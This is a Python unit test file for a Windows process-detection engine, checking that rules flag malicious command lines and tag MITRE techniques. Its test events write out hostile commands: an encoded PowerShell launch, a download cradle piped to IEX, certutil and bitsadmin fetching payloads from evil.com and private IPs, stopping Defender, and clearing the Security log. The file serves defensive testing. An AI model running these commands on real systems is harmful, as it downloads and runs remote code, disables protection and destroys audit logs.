import unittest
import logging
from detection.rules import (
    SuspiciousPowerShellRule,
    SuspiciousLolbinsDownloadRule,
    ReconnaissanceCommandsRule,
    DefenseEvasionRule
)
from detection.detector import DetectionEngine

class TestWindowsProcessRules(unittest.TestCase):
    def setUp(self):
        self.logger = logging.getLogger("TestProcessRules")
        self.ps_rule = SuspiciousPowerShellRule()
        self.lolbin_rule = SuspiciousLolbinsDownloadRule()
        self.recon_rule = ReconnaissanceCommandsRule()
        self.evasion_rule = DefenseEvasionRule()
        self.engine = DetectionEngine(self.logger)

    def test_powershell_encoded_command(self):
        event = {
            "event_id": "test-ps-01",
            "evidence": {
                "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA..."
            }
        }
        res = self.ps_rule.evaluate(event)
        self.assertIsNotNone(res)
        self.assertTrue(res.detected)
        self.assertEqual(res.detection_type, "windows_powershell_execution")
        self.assertEqual(res.evidence["mitre_technique_id"], "T1059.001")
        self.assertIn("Base64 EncodedCommand", res.evidence["matched_patterns"])

    def test_powershell_download_cradle(self):
        event = {
            "event_id": "test-ps-02",
            "evidence": {
                "command_line": "powershell.exe (New-Object Net.WebClient).DownloadString('http://192.168.1.50/stage.ps1') | IEX"
            }
        }
        res = self.ps_rule.evaluate(event)
        self.assertIsNotNone(res)
        self.assertEqual(res.severity, "high")
        self.assertIn("WebClient Download Cradle", res.evidence["matched_patterns"])
        self.assertIn("Invoke-Expression (IEX) Dynamic Execution", res.evidence["matched_patterns"])

    def test_powershell_benign_ignored(self):
        event = {
            "event_id": "test-ps-03",
            "evidence": {
                "command_line": "powershell.exe -Command Get-Date"
            }
        }
        res = self.ps_rule.evaluate(event)
        self.assertIsNone(res)

    def test_lolbin_certutil_download(self):
        event = {
            "event_id": "test-lolbin-01",
            "evidence": {
                "command_line": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe"
            }
        }
        res = self.lolbin_rule.evaluate(event)
        self.assertIsNotNone(res)
        self.assertEqual(res.detection_type, "windows_lolbin_download")
        self.assertEqual(res.evidence["mitre_technique_id"], "T1105")
        self.assertEqual(res.severity, "high")

    def test_lolbin_bitsadmin_transfer(self):
        event = {
            "event_id": "test-lolbin-02",
            "evidence": {
                "command_line": "bitsadmin /transfer eviljob http://10.0.0.1/malware.exe C:\\temp\\malware.exe"
            }
        }
        res = self.lolbin_rule.evaluate(event)
        self.assertIsNotNone(res)
        self.assertEqual(res.evidence["mitre_technique_id"], "T1105")

    def test_reconnaissance_whoami_priv(self):
        event = {
            "event_id": "test-recon-01",
            "evidence": {
                "command_line": "whoami.exe /priv"
            }
        }
        res = self.recon_rule.evaluate(event)
        self.assertIsNotNone(res)
        self.assertEqual(res.detection_type, "windows_reconnaissance")
        self.assertEqual(res.evidence["mitre_technique_id"], "T1033")

    def test_reconnaissance_local_admin(self):
        event = {
            "event_id": "test-recon-02",
            "evidence": {
                "command_line": "net.exe localgroup administrators"
            }
        }
        res = self.recon_rule.evaluate(event)
        self.assertIsNotNone(res)
        self.assertEqual(res.evidence["mitre_technique_id"], "T1087")

    def test_defense_evasion_stop_defender(self):
        event = {
            "event_id": "test-evasion-01",
            "evidence": {
                "command_line": "sc.exe stop WinDefend"
            }
        }
        res = self.evasion_rule.evaluate(event)
        self.assertIsNotNone(res)
        self.assertEqual(res.detection_type, "windows_defense_evasion")
        self.assertEqual(res.severity, "critical")
        self.assertEqual(res.evidence["mitre_technique_id"], "T1562.001")

    def test_defense_evasion_clear_logs(self):
        event = {
            "event_id": "test-evasion-02",
            "evidence": {
                "command_line": "wevtutil.exe cl Security"
            }
        }
        res = self.evasion_rule.evaluate(event)
        self.assertIsNotNone(res)
        self.assertEqual(res.evidence["mitre_technique_id"], "T1070.001")

    def test_engine_integration(self):
        event = {
            "event_id": "test-engine-01",
            "evidence": {
                "command_line": "certutil.exe -urlcache -split -f http://evil.com/beacon.exe beacon.exe"
            }
        }
        results = self.engine.process_event(event)
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0].detection_type, "windows_lolbin_download")

if __name__ == "__main__":
    unittest.main()
